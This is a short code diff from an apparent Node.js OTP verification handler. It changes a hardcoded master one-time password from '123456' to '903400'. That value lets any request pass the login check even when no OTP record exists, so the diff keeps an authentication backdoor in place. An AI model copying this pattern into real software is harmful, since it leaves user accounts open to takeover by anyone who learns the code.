@@ -154,7 +154,7 @@ export const verifyOtp = async (req, res) => {
   const identifier = normalizeIdentifier(req.body.identifier);
 
   const otpDoc = await Otp.findOne({ identifier });
-  const isMaster = String(otp) === "123456";
+  const isMaster = String(otp) === "903400";
 
   if (!otpDoc && !isMaster)
     return errorResponse(res, 400, "Invalid OTP");
